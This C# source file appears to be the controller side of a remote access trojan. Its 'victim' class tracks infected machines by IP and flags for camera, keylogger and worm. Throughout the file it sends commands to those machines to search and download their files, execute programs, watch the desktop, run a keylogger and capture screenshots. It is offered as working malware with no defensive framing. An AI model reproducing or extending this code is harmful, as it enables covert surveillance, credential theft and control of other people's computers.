using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Net;


namespace ConsoleApplication4
{
    public class victim

    {   private Socket s;

        private Thread guip; // the form 
     //   private  Thread guip2 = new Thread(()=>run_gui2(s)); // the form file nav


        private String ip;
        private String name;

        private String processId; 

        private int port; 
        private byte cam ; 
        private  byte key ;
        private byte worm ;
        private String date;

        public Listener ls;
        public Writer wr; 
        
       public  victim ( String name ,String processId, Socket s,byte cam , byte key ,byte worm ,String date ){
            
            this.name = name;
            this.processId = processId;   
             
            this.s = s;
            IPEndPoint remoteIpEndPoint = s.RemoteEndPoint as IPEndPoint;
            ip = ""+remoteIpEndPoint.Address;
            port = remoteIpEndPoint.Port; 
            this.cam =cam ;
            this.worm =worm ;
            this.date = date;
            this.key = key;
            wr = new Writer(s);  
            ls = new Listener(s);
            Thread th = new Thread(() => ls.listen());
            th.IsBackground = true; 
            th.Start();
        }

        
        public String getIp() { return ip;  }
        public int getPort() { return port;  }
        public byte getCam() { return cam; }
        public byte getKey() { return key; }
        public byte getWorm() { return worm; }
        public String getDate() { return date; }
        public String getName() { return name; }

        public void setKey(byte key) { this.key = key ;}
        public void setCam(byte cam) { this.cam =cam  ;}
        public void setWorm(byte worm) { this.worm = worm; }
        public void setName(String name) { this.name= name; }


        public void cmd()
        {
            
            MyConsole mc = new MyConsole(this.ls , this.wr);
            mc.Show(); 

        }

        public async Task<Msg> getSearchResult(String path , String patern ) {

            wr.sendString("s9"+path+"\0"+patern);


            String result = await ls.findResultOut(); 
            return    new Msg () { a=result , b=this.name };

        }

        public async Task<Msg> JustStop_Stop()
        {

            wr.sendString("v9");


            String result = await ls.findResultVirusOut();
           
            return new Msg() { a = result, b = this.name };

        }

        public void exec(String name) {
            String [] temp = name.Split(Path.DirectorySeparatorChar);
            name = temp[temp.Length - 1];
            wr.sendString("97" + name); 
        }

        public void desktop(){
            user_controle uc = new user_controle(s,this.ls, this.wr);
            uc.Show();
            Thread th = new Thread (()=>uc.animate()) ;
            th.Start(); 
        }

        public void keylogger() {
            keylogger k = new keylogger(this.wr , this.ls, this.processId);
            k.Show(); 
        }

        public void speak() {
            Speak s = new Speak(this.wr,this.ls);
            s.Show(); 
        }
        public void nav() {
            file_nav n = new file_nav(this.wr, this.ls);
            n.Show(); 
        }


        public void work() {
            UTF8Encoding asen = new UTF8Encoding();
            do
            {
                byte[] b = new byte[100];
                int k=10;
                Console.WriteLine("Recieved...");
                for (int i = 0; i < k; i++)
                    Console.Write(Convert.ToChar(b[i]));


                Console.Write(" \nenter command : ");
                String cmd;
                cmd = Console.ReadLine();
                if (cmd.ToString() == "q") break;
                s.Send(asen.GetBytes(cmd));
                int a = Convert.ToInt16(cmd.Substring(0, 2));
                switch (a)
                {
                    case 0:
                        byte[] buffer = new byte[10000];
                        k = s.Receive(buffer);
                        Console.WriteLine(asen.GetString(buffer).TrimEnd('\0'));
                        break;
                    case 3:
                        if (cmd.Trim().Length > 2)
                        {

                            buffer = new byte[8];

                            k = s.Receive(buffer);
                            if (k == 1)
                            {
                                Console.WriteLine("file doesn't exists");
                            }
                            else
                            {
                                cmd = cmd.Substring(2).Trim();

                                long i = BitConverter.ToInt64(buffer, 0);

                                k = 0;
                                buffer = new byte[1000];
                                cmd = cmd.Replace("/", " ");
                                cmd = cmd.Replace(":", " ");
                                using (BinaryWriter binWriter = new BinaryWriter(File.Open(cmd + ".xml", FileMode.Create)))
                                {
                                    while (i > k)
                                    {
                                        buffer.Initialize();
                                        k = s.Receive(buffer);
                                        binWriter.Write(buffer);

                                    }
                                    Console.WriteLine("File Received");
                                }
                            }

                        }
                        else
                        {
                            buffer = new byte[1000];
                            k = s.Receive(buffer);
                            Console.WriteLine(asen.GetString(buffer).TrimEnd('\0'));
                        }
                        break;
                    case 4:
                        buffer = new byte[300000]; //300 kb  buffer
                        using (BinaryWriter binWriter = new BinaryWriter(File.Open("screen.jpeg", FileMode.Create)))
                        {
                            do
                            {
                                k = s.Receive(buffer);
                                binWriter.Write(buffer, 0, k);

                            } while (k > (buffer.Length - 5));


                            System.Diagnostics.Process.Start("cmd.exe", "/B /C screen.jpeg");
                        }
                        break;
                    default:
                        Console.WriteLine("\nSent Acknowledgement");
                        break;
                    case 5:
                        Application.EnableVisualStyles();
                        
                        break;
                    case 6:
                        if (guip.IsAlive) guip.Abort();
                        Thread.Sleep(1);
                        break;
                    case 7:
                        // used to send speech !!
                        break;
                    case 8: // navigate files 

                       /* Application.EnableVisualStyles();
                        guip2.SetApartmentState(ApartmentState.STA);
                        if (!guip2.IsAlive) guip2.Start();
                        */
                        break;


                }
            } while (true);/* clean up */
            s.Close();
           


        }

       public bool SocketConnected()
        {
            bool part1 = s.Poll(1000, SelectMode.SelectRead);
            bool part2 = (s.Available == 0);
            if (part1 && part2)
                return false;
            else
                return true;
        }

        public void close() {
           
            s.Shutdown(SocketShutdown.Both);
            s.Close();
        }

       
        
    }
}
